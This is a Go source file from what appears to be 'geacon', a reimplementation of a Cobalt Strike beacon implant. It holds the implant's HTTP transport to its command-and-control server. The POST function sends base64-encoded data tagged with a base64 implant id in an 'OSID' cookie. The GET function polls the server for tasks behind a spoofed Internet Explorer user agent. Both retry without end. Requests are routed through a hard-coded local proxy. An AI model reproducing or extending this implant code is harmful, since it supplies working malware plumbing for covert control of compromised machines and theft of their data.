package packet

import (
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"geacon/config"
	"net/http"
	"time"

	"github.com/imroc/req"
)

var (
	httpRequest = req.New()
)

func init() {
	httpRequest.SetTimeout(config.TimeOut * time.Second)
	trans, _ := httpRequest.Client().Transport.(*http.Transport)
	trans.MaxIdleConns = 20
	trans.TLSHandshakeTimeout = config.TimeOut * time.Second
	trans.DisableKeepAlives = true
	trans.TLSClientConfig = &tls.Config{InsecureSkipVerify: config.VerifySSLCert}
}

//TODO c2profile
func HttpPost(url string, id string, data []byte) *req.Resp {
	httpRequest.SetProxyUrl("http://127.0.0.1:8080")
	httpHeaders := req.Header{
		"Content-Type": "application/x-www-form-urlencoded;charset=utf-8",
		"Cookie":       "OSID=" + base64.StdEncoding.EncodeToString([]byte(id)), //base64编码id
	}
	for {
		resp, err := httpRequest.Post(url, base64.StdEncoding.EncodeToString(data), httpHeaders)  //数据也要base64编码发送
		if err != nil {
			fmt.Printf("!error: %v\n", err)
			time.Sleep(config.WaitTime)
			continue
		} else {
			if resp.Response().StatusCode == http.StatusOK {
				//close socket
				return resp
			}
			break
		}
	}

	return nil
}
func HttpGet(url string, cookies string) *req.Resp {
	httpHeaders := req.Header{
		"User-Agent":      "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9;ENUS)",
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"DNT":             "1",
		"Accept-Encoding": "gzip, deflate",
		"Accept-Language": "en-US,en;q=0.5",
		"Cookie":          "OSID=" + cookies,
	}
	httpRequest.SetProxyUrl("http://127.0.0.1:8080")
	for {
		resp, err := httpRequest.Get(url, httpHeaders)
		if err != nil {
			fmt.Printf("!error: %v\n", err)
			time.Sleep(config.WaitTime)
			continue
			//panic(err)
		} else {
			if resp.Response().StatusCode == http.StatusOK {
				//close socket
				return resp
			}
			break
		}
	}
	return nil
}
